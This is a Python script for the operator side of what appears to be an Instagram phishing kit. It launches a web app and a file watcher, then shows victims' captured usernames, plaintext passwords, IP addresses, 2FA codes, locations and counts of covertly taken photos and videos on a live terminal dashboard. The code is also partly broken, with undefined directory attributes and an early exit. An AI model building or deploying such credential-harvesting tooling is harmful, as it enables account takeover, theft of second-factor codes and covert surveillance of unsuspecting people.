#!/usr/bin/env python3
import os
import json
import time
import subprocess
import sys
from datetime import datetime
from colorama import init, Fore, Back, Style
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import threading
import logging
from logging.handlers import RotatingFileHandler
import werkzeug.serving
import requests
import signal
import atexit
from typing import Dict, List, Optional, Any
import random
from time import sleep
from pyfiglet import Figlet
import colorama
from colorama import init, Fore, Back, Style
from tqdm import tqdm
import asyncio
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn

# Import app from minimal_app.py
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from minimal_app import app

# Initialize colorama for terminal colors
init(autoreset=True)

# Configure logging
def setup_logging():
    log_dir = 'logs'
    os.makedirs(log_dir, exist_ok=True)
    
    # Create a rotating file handler
    file_handler = RotatingFileHandler(
        os.path.join(log_dir, 'launcher.log'),
        maxBytes=1024 * 1024,  # 1MB
        backupCount=5
    )
    file_handler.setFormatter(logging.Formatter(
        '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
    ))
    
    # Configure root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.INFO)
    root_logger.addHandler(file_handler)

# ASCII Art Logo with gradient effect
def get_gradient_text(text, start_color, end_color):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    result = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        result += f"{color}{char}"
    return result

INSTAGRAM_LOGO = """
{gradient}░▒▓█▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████████████▓▒░{reset}  
{gradient}░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░{reset} 
{gradient}░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░{reset} 
{gradient}░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░  ░▒▓████████▓▒░▒▓█▓▒▒▓███▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░{reset} 
{gradient}░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░{reset} 
{gradient}░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░{reset} 
{gradient}░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░{reset} 
{reset}                                                                                                                      
{reset}                                                                                                                      
"""

class DataCollector(FileSystemEventHandler):
    """Monitor file system events and collect login data with improved error handling and security"""
    def __init__(self):
        super().__init__()
        self.console = Console()
        self.layout = Layout()
        self.setup_layout()
        self.setup_directories()
        self.clear_old_data()
        self.load_existing_data()
        self.lock = threading.Lock()
        self.last_update = time.time()
        self.update_interval = 1.0
        self.animation_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.current_frame = 0
        self.visitors_count = 0
        self.login_count = 0
        self.location_count = 0
        self.photo_count = 0
        self.video_count = 0
        
        self.login_data = []
        self.location_data = []
        self.verify_data = []
        
        self.latest_data = {
            'username': '',
            'password': '',
            'ip': '',
            '2fa': '',
            'location': '',
            'video': ''
        }
        
        # Start display update thread
        self.display_thread = threading.Thread(target=self.update_display, daemon=True)
        self.display_thread.start()

    def setup_layout(self):
        self.layout.split(
            Layout(name="header", size=3),
            Layout(name="main"),
            Layout(name="footer", size=3)
        )
        self.layout["main"].split_row(
            Layout(name="stats", ratio=1),
            Layout(name="data", ratio=2)
        )

    def get_animated_header(self) -> Panel:
        self.current_frame = (self.current_frame + 1) % len(self.animation_frames)
        gradient_logo = INSTAGRAM_LOGO.format(
            gradient=get_gradient_text("█", Fore.RED, Fore.MAGENTA),
            reset=Style.RESET_ALL
        )
        return Panel(
            Text(gradient_logo, justify="center"),
            title=f"Instagram Data Collector {self.animation_frames[self.current_frame]}",
            border_style="bright_blue"
        )

    def get_stats_table(self) -> Table:
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")
        
        with self.lock:
            table.add_row("Total Visitors", str(self.visitors_count))
            table.add_row("Total Logins", str(self.login_count))
            table.add_row("Total Locations", str(self.location_count))
            table.add_row("Total Photos", str(self.photo_count))
            table.add_row("Total Videos", str(self.video_count))
        
        return table

    def get_data_panel(self) -> Panel:
        with self.lock:
            latest_data = self.latest_data.copy()
            login_data = self.login_data[-1] if self.login_data else {}
            location_data = self.location_data[-1] if self.location_data else {}
            verify_data = self.verify_data[-1] if self.verify_data else {}
        
        content = []
        
        # Add login data
        if login_data:
            content.append(f"[cyan]Username:[/cyan] [green]{login_data.get('username', '')}[/green]")
            content.append(f"[cyan]Password:[/cyan] [green]{login_data.get('password', '')}[/green]")
            content.append(f"[cyan]IP Address:[/cyan] [green]{login_data.get('ip', '')}[/green]")
            content.append("")
        
        # Add 2FA data
        if verify_data:
            content.append(f"[cyan]2FA Code:[/cyan] [green]{verify_data.get('verification_code', '')}[/green]")
            content.append(f"[cyan]2FA IP:[/cyan] [green]{verify_data.get('ip', '')}[/green]")
            content.append(f"[cyan]2FA Time:[/cyan] [green]{verify_data.get('time', '')}[/green]")
            content.append("")
        
        # Add location data
        if location_data:
            content.append(f"[cyan]Location:[/cyan] [green]{location_data.get('content', '')}[/green]")
            content.append("")
        
        # Add media counts
        if self.photo_count > 0 or self.video_count > 0:
            content.append(f"[cyan]Photos Captured:[/cyan] [green]{self.photo_count}[/green]")
            content.append(f"[cyan]Videos Captured:[/cyan] [green]{self.video_count}[/green]")
        
        return Panel(
            Text("\n".join(content) if content else "No data available"),
            title="Latest Data",
            border_style="bright_yellow"
        )

    def setup_directories(self):
        """Setup required directories with proper permissions"""
        try:
            for directory in [self.data_dir, self.upload_dir]:
                os.makedirs(directory, exist_ok=True)
                os.chmod(directory, 0o700)
        except Exception as e:
            logging.error(f"Error setting up directories: {str(e)}")

    def clear_old_data(self):
        """Clear all data files from previous sessions with improved error handling"""
        try:
            for directory in [self.data_dir, self.upload_dir]:
                for file in os.listdir(directory):
                    file_path = os.path.join(directory, file)
                    if os.path.isfile(file_path):
                        try:
                            os.unlink(file_path)
                        except Exception as e:
                            logging.error(f"Error deleting file {file_path}: {str(e)}")
            
            logging.info("Cleared all old data files")
        except Exception as e:
            logging.error(f"Error clearing old data: {str(e)}")

    def load_existing_data(self):
        """Load existing data from files with improved error handling"""
        try:
            # Load login data
            login_files = [f for f in os.listdir(self.data_dir) 
                         if f.startswith('instagram_login_') and f.endswith('.json')]
            self.login_count = len(login_files)
        
            # Load location data
            location_files = [f for f in os.listdir(self.data_dir) 
                            if f.startswith('location_') and f.endswith('.txt')]
            self.location_count = len(location_files)
        
            # Count photos
            photo_files = [f for f in os.listdir(self.upload_dir) 
                         if f.startswith('photo_instagram_') and f.endswith('.jpg')]
            self.photo_count = len(photo_files)
            
        except Exception as e:
            logging.error(f"Error loading existing data: {str(e)}")

    def process_login_file(self, filepath: str):
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            with self.lock:
                if data not in self.login_data:
                    self.login_data.append(data)
                    self.login_count += 1
                    self.latest_data['username'] = data.get('username', '')
                    self.latest_data['password'] = data.get('password', '')
                    self.latest_data['ip'] = data.get('ip', '')
            self.visitors_count = max(self.visitors_count, self.login_count)
            
            logging.info(f"Processed login file: {filepath}")
        except Exception as e:
            logging.error(f"Error processing login file: {str(e)}")

    def process_location_file(self, filepath: str):
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
                
            location_entry = {"filepath": filepath, "content": content}
            
            with self.lock:
                if not any(entry['filepath'] == filepath for entry in self.location_data):
                    self.location_data.append(location_entry)
                    self.location_count += 1
                    self.latest_data['location'] = content
            
            logging.info(f"Processed location file: {filepath}")
        except Exception as e:
            logging.error(f"Error processing location file: {str(e)}")

    def process_verify_file(self, filepath: str):
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            with self.lock:
                if data not in self.verify_data:
                    self.verify_data.append(data)
                    self.latest_data['2fa'] = data.get('verification_code', '')
                    self.latest_data['ip'] = data.get('ip', '')
            
            logging.info(f"Processed verify file: {filepath}")
        except Exception as e:
            logging.error(f"Error processing verify file: {str(e)}")

    def on_created(self, event):
        if not event.is_directory:
            try:
                filepath = event.src_path
                filename = os.path.basename(filepath)
                
                if filename.startswith('instagram_login_') and filename.endswith('.json'):
                    self.process_login_file(filepath)
                elif filename.startswith('location_') and filename.endswith('.txt'):
                    self.process_location_file(filepath)
                elif filename.startswith('instagram_verify_') and filename.endswith('.json'):
                    self.process_verify_file(filepath)
                elif filename.startswith('photo_instagram_') and filename.endswith('.jpg'):
                    with self.lock:
                        self.photo_count += 1
                elif filename.startswith('video_instagram_') and filename.endswith('.webm'):
                    with self.lock:
                        self.video_count += 1
                
            except Exception as e:
                logging.error(f"Error processing file creation: {str(e)}")

    def update_display(self):
        """Update the display with improved error handling"""
        try:
            with Live(self.layout, refresh_per_second=4, console=self.console) as live:
                while True:
                    # Clear screen
                    os.system('cls' if os.name == 'nt' else 'clear')
                    
                    # Update header
                    self.layout["header"].update(self.get_animated_header())
                    
                    # Update stats
                    stats_table = self.get_stats_table()
                    self.layout["stats"].update(Panel(stats_table, border_style="bright_blue"))
                    
                    # Update data panel
                    data_panel = self.get_data_panel()
                    self.layout["data"].update(data_panel)
                    
                    # Update footer
                    self.layout["footer"].update(
                        Panel(
                            Text(f"Last update: {datetime.now().strftime('%H:%M:%S')}", justify="center"),
                            border_style="dim"
                        )
                    )
                    
                    time.sleep(0.25)
        except Exception as e:
            logging.error(f"Error in update_display: {str(e)}")

def show_start_screen():
    """Show the start screen with logo in red color and wave effect"""
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Convert logo to red and remove gradient/reset markers
    logo_lines = INSTAGRAM_LOGO.strip().split('\n')
    logo_lines = [line.replace('{gradient}', '').replace('{reset}', '') for line in logo_lines]
    
    # Base red color
    base_color = Fore.RED
    
    # Wave effect colors (brighter red shades)
    wave_colors = [
        Fore.RED + Style.BRIGHT,
        Fore.RED + Style.NORMAL,
        Fore.RED + Style.DIM
    ]
    
    # Flag to control wave animation
    keep_waving = True
    
    # Function to handle Enter key press
    def on_enter_press():
        nonlocal keep_waving
        input()
        keep_waving = False
    
    # Start a thread to handle Enter key press
    enter_thread = threading.Thread(target=on_enter_press)
    enter_thread.daemon = True
    enter_thread.start()
    
    # Show wave effect until Enter is pressed
    wave_cycle = 0
    while keep_waving:
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Create wave effect
        wave_logo = ""
        for line in logo_lines:
            wave_line = ""
            for j, char in enumerate(line):
                # Calculate wave position
                wave_pos = (j + wave_cycle) % len(line)
                # Apply wave effect only to a small section
                if wave_pos < 5:  # Wave width
                    wave_line += f"{wave_colors[wave_pos % len(wave_colors)]}{char}"
                else:
                    wave_line += f"{base_color}{char}"
            wave_logo += wave_line + "\n"
        
        print(wave_logo)
        print(f"{Fore.YELLOW}[*] Press Enter to start...{Style.RESET_ALL}")
        time.sleep(0.02)  # Faster wave speed
        wave_cycle += 1
    
    # Countdown with wave effect
    for i in range(3, -1, -1):
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Create wave effect
        wave_logo = ""
        for line in logo_lines:
            wave_line = ""
            for j, char in enumerate(line):
                # Calculate wave position
                wave_pos = (j + wave_cycle) % len(line)
                # Apply wave effect only to a small section
                if wave_pos < 5:  # Wave width
                    wave_line += f"{wave_colors[wave_pos % len(wave_colors)]}{char}"
                else:
                    wave_line += f"{base_color}{char}"
            wave_logo += wave_line + "\n"
        
        print(wave_logo)
        print(f"{Fore.CYAN}[*] Starting in {i} seconds...{Style.RESET_ALL}")
        time.sleep(1)
        wave_cycle += 1
    
    # Clear screen one more time
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    setup_logging()
    logging.info("Starting Instagram Data Collector")
    
    try:
        # Show start screen
        show_start_screen()
        
        # Create and start the data collector
        collector = DataCollector()
        
        # Start the file system observer
        observer = Observer()
        observer.schedule(collector, path='.', recursive=False)
        observer.start()
        
        # Start Flask app in a separate thread
        flask_thread = threading.Thread(
            target=lambda: app.run(host='0.0.0.0', port=50005, debug=False),
            daemon=True
        )
        flask_thread.start()
        
        # Register cleanup function
        def cleanup():
            logging.info("Cleaning up...")
            observer.stop()
            observer.join()
        sys.exit(0)
        
        atexit.register(cleanup)
        
        # Handle Ctrl+C gracefully
        def signal_handler(sig, frame):
            print("\n[!] Received Ctrl+C. Shutting down gracefully...")
            cleanup()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Keep the main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        logging.info("Received keyboard interrupt, shutting down...")
    except Exception as e:
        logging.error(f"Error in main: {str(e)}")
    finally:
        cleanup()

if __name__ == "__main__":
    main() 